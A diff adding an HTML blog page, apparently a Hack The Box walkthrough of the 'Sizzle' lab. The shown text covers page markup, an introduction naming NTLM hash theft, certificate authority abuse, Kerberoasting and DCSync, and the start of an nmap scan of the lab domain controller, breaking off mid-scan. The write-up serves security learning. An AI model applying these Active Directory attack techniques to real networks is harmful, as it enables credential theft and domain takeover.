@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Introduction Welcome back to another writeup! I’m going to be going through Hack the Box’s Sizzle. This one was a doozy and, I won’t lie, I used hints from the description of the box and several walkthroughs to finish this box. Sizzle requires that you grab NTLM hashes via SMB, abuse the certificate authority, Kerberoast and DCSync to finish the box.\nNmap Let’s get things started with NMAP.\nPORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn&#39;t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-title: Site doesn&#39;t have a title (text/html). | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | tls-alpn: | h2 |_ http/1.1 |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 3269/tcp open ssl/ldap | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | tls-alpn: | h2 |_ http/1.1 |_http-title: Not Found |_ssl-date: 2026-06-30T16:29:14+00:00; -2s from scanner time. | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49687/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49688/tcp open msrpc Microsoft Windows RPC 49692/tcp open msrpc Microsoft Windows RPC 49695/tcp open msrpc Microsoft Windows RPC 49707/tcp open msrpc Microsoft Windows RPC 49711/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%) OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2026-06-30T16:28:36 |_ start_date: 2026-06-30T16:21:40 |_clock-skew: mean: -2s, deviation: 0s, median: -3s Looking at the results, I know that this is a Windows environment and we’re running against a Domain Controller. I immediately notice FTP, HTTP and HTTPS as a good point to start scanning while examining SSH.\n">
+<title>HTB - Sizzle</title>
+
+
+<link rel="canonical" href="http://localhost:1313/walkthroughs/sizzle/">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+
+
+<link rel="stylesheet" href="/scss/style.min.939567bcbd3acb48d79ff58d0271cb631c4a22521655556191d2a0d466ceb5fc.css"><meta property='og:title' content="HTB - Sizzle">
+<meta property='og:description' content="Introduction Welcome back to another writeup! I’m going to be going through Hack the Box’s Sizzle. This one was a doozy and, I won’t lie, I used hints from the description of the box and several walkthroughs to finish this box. Sizzle requires that you grab NTLM hashes via SMB, abuse the certificate authority, Kerberoast and DCSync to finish the box.\nNmap Let’s get things started with NMAP.\nPORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn&#39;t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-title: Site doesn&#39;t have a title (text/html). | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | tls-alpn: | h2 |_ http/1.1 |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 3269/tcp open ssl/ldap | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | tls-alpn: | h2 |_ http/1.1 |_http-title: Not Found |_ssl-date: 2026-06-30T16:29:14+00:00; -2s from scanner time. | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49687/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49688/tcp open msrpc Microsoft Windows RPC 49692/tcp open msrpc Microsoft Windows RPC 49695/tcp open msrpc Microsoft Windows RPC 49707/tcp open msrpc Microsoft Windows RPC 49711/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%) OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2026-06-30T16:28:36 |_ start_date: 2026-06-30T16:21:40 |_clock-skew: mean: -2s, deviation: 0s, median: -3s Looking at the results, I know that this is a Windows environment and we’re running against a Domain Controller. I immediately notice FTP, HTTP and HTTPS as a good point to start scanning while examining SSH.\n">
+<meta property='og:url' content='http://localhost:1313/walkthroughs/sizzle/'>
+<meta property='og:site_name' content='MidwestSec'>
+<meta property='og:type' content='article'><meta property='article:section' content='Walkthroughs' /><meta property='article:tag' content='Walkthrough' /><meta property='article:tag' content='Hack The Box' /><meta property='article:published_time' content='2026-06-30T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-06-30T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="HTB - Sizzle">
+<meta name="twitter:description" content="Introduction Welcome back to another writeup! I’m going to be going through Hack the Box’s Sizzle. This one was a doozy and, I won’t lie, I used hints from the description of the box and several walkthroughs to finish this box. Sizzle requires that you grab NTLM hashes via SMB, abuse the certificate authority, Kerberoast and DCSync to finish the box.\nNmap Let’s get things started with NMAP.\nPORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn&#39;t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-title: Site doesn&#39;t have a title (text/html). | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | tls-alpn: | h2 |_ http/1.1 |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 3269/tcp open ssl/ldap | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 |_ssl-date: 2026-06-30T16:29:13+00:00; -3s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | tls-alpn: | h2 |_ http/1.1 |_http-title: Not Found |_ssl-date: 2026-06-30T16:29:14+00:00; -2s from scanner time. | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2021-02-11T12:59:51 |_Not valid after: 2022-02-11T12:59:51 |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49687/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49688/tcp open msrpc Microsoft Windows RPC 49692/tcp open msrpc Microsoft Windows RPC 49695/tcp open msrpc Microsoft Windows RPC 49707/tcp open msrpc Microsoft Windows RPC 49711/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%) OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2026-06-30T16:28:36 |_ start_date: 2026-06-30T16:21:40 |_clock-skew: mean: -2s, deviation: 0s, median: -3s Looking at the results, I know that this is a Windows environment and we’re running against a Domain Controller. I immediately notice FTP, HTTP and HTTPS as a good point to start scanning while examining SSH.\n"><link href="/pagefind/pagefind-ui.css" rel="stylesheet">
+
+<style>
+     
+
+    #mw-reading-progress {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 0%;
+        height: 3px;
+        z-index: 10000;
+        background: var(--accent-color);
+        transition: width 0.1s ease-out;
+    }
+
+     
+
+    #mw-search-button {
+        width: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 10px;
+
+        padding: 10px 14px;
+        margin-bottom: 16px;
+
+        border: 1px solid var(--card-separator-color);
+        border-radius: 8px;
+
+        background: var(--card-background);
+        color: var(--card-text-color-main);
+
+        cursor: pointer;
+        text-align: left;
+
+        transition: background-color 0.2s ease;
+    }
+
+    #mw-search-button:hover {
+        background: var(--card-background-selected);
+    }
+
+    .mw-search-left {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .mw-search-icon {
+        width: 18px;
+        height: 18px;
+        fill: currentColor;
+    }
+
+    .mw-search-shortcut {
+        font-size: 0.8em;
+        opacity: 0.65;
+    }
+
+     
+
+    #mw-search-modal {
+        display: none;
+        position: fixed;
+        inset: 0;
+        z-index: 9999;
+
+        padding: 8vh 16px;
+        overflow-y: auto;
+
+        background: rgba(0, 0, 0, 0.65);
+        backdrop-filter: blur(5px);
+    }
+
+    #mw-search-box {
+        max-width: 850px;
+        margin: auto;
+        padding: 24px;
+
+        background: var(--card-background);
+        color: var(--card-text-color-main);
+
+        border-radius: 12px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+    }
+
+    #mw-search-close {
+        margin-bottom: 16px;
+        padding: 8px 14px;
+
+        border: 1px solid var(--card-separator-color);
+        border-radius: 6px;
+
+        background: var(--card-background);
+        color: var(--card-text-color-main);
+
+        cursor: pointer;
+    }
+
+     
+
+    .pagefind-ui {
+        --pagefind-ui-primary: var(--accent-color);
+        --pagefind-ui-background: var(--card-background);
+        --pagefind-ui-text: var(--card-text-color-main);
+        --pagefind-ui-border: var(--card-separator-color);
+        --pagefind-ui-tag: var(--accent-color);
+    }
+
+    .pagefind-ui,
+    .pagefind-ui * {
+        color: var(--card-text-color-main) !important;
+    }
+
+    .pagefind-ui__search-input {
+        background: var(--card-background) !important;
+        color: var(--card-text-color-main) !important;
+        border: 1px solid var(--card-separator-color) !important;
+    }
+
+    .pagefind-ui__drawer {
+        background: var(--card-background) !important;
+    }
+
+    .pagefind-ui__result {
+        padding: 16px 0 !important;
+        background: var(--card-background) !important;
+        border-bottom: 1px solid var(--card-separator-color) !important;
+    }
+
+    .pagefind-ui__result-title a,
+    .pagefind-ui__result-excerpt,
+    .pagefind-ui__message,
+    .pagefind-ui__result-link,
+    .pagefind-ui__button {
+        color: var(--card-text-color-main) !important;
+    }
+
+    .pagefind-ui__result-thumb img {
+        border-radius: 6px;
+    }
+
+    .mw-result-meta {
+        margin-top: 4px;
+        margin-bottom: 8px;
+
+        font-size: 0.85em;
+        opacity: 0.7;
+    }
+
+    mark {
+        padding: 0 2px;
+        background: var(--accent-color);
+        color: var(--accent-color-text);
+    }
+</style>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        <figure class="site-avatar">
+                <a href="/">
+                    <img src="/images/MidwestSec_bw.png" 
+                        width="1254"
+                        height="1254"
+                        class="site-logo"
+                        loading="lazy"
+                        alt="Avatar">
+                </a>
+                
+            </figure>
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">MidwestSec</a></h1>
+            <h2 class="site-description">Just a Guy Learning</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/whoami/' >
+                
+                <span>whoami</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/blog/' >
+                
+                <span>Blog</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/walkthroughs/' >
+                
+                <span>Walkthroughs</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/tags/' >
+                
+                <span>Tags</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='https://newsletter.midwestsec.com' >
+                
+                <span>Newsletter</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav class="toc-nav" id="TableOfContents">
+                
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#nmap">Nmap</a></li>
+    <li><a href="#initial-steps">Initial Steps</a></li>
+    <li><a href="#smb">SMB</a></li>
+    <li><a href="#stealing-hashes">Stealing Hashes</a></li>
+    <li><a href="#cert-time">Cert Time</a></li>
+    <li><a href="#back-to-winrm">Back to WinRM</a></li>
+    <li><a href="#its-kerberoasting-time">It&rsquo;s Kerberoasting Time</a></li>
+    <li><a href="#pwned">Pwned</a></li>
+    <li><a href="#final-thoughts">Final Thoughts</a></li>
+  </ul>
+
+            </nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/walkthroughs/sizzle/">HTB - Sizzle</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    
+    
+    
+    <footer class="article-meta">
+        
+            <div class="inline-meta">
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                    <time class="article-time--published" datetime='2026-06-30T00:00:00Z'>Tuesday, June 30, 2026</time>
+                
+
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                    <time class="article-time--reading">
+                        11 minutes read
+                    </time>
+                
+            </div>
+        
+
+        
+
+        
+    </footer>
+    
+</div>
+
+</header>
+
+    
+    <aside class="article-toc">
+        <details>
+            <summary>
+                <div class="article-toc-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6" /></svg>
+                    <span>Table of contents</span>
+                </div>
+            </summary>
+            <nav class="toc-nav">
+                
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#nmap">Nmap</a></li>
+    <li><a href="#initial-steps">Initial Steps</a></li>
+    <li><a href="#smb">SMB</a></li>
+    <li><a href="#stealing-hashes">Stealing Hashes</a></li>
+    <li><a href="#cert-time">Cert Time</a></li>
+    <li><a href="#back-to-winrm">Back to WinRM</a></li>
+    <li><a href="#its-kerberoasting-time">It&rsquo;s Kerberoasting Time</a></li>
+    <li><a href="#pwned">Pwned</a></li>
+    <li><a href="#final-thoughts">Final Thoughts</a></li>
+  </ul>
+
+            </nav>
+        </details>
+    </aside>
+    
+
+    <section class="article-content">
+    
+    
+    <h2 id="introduction"><a href="#introduction" class="header-anchor"></a>Introduction
+</h2><p>Welcome back to another writeup! I’m going to be going through Hack the Box’s Sizzle. This one was a doozy and, I won’t lie, I used hints from the description of the box and several walkthroughs to finish this box. Sizzle requires that you grab NTLM hashes via SMB, abuse the certificate authority, Kerberoast and DCSync to finish the box.</p>
+<h2 id="nmap"><a href="#nmap" class="header-anchor"></a>Nmap
+</h2><p>Let’s get things started with NMAP.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp           Microsoft ftpd
+</span></span><span style="display:flex;"><span>|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|_  SYST: Windows_NT
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
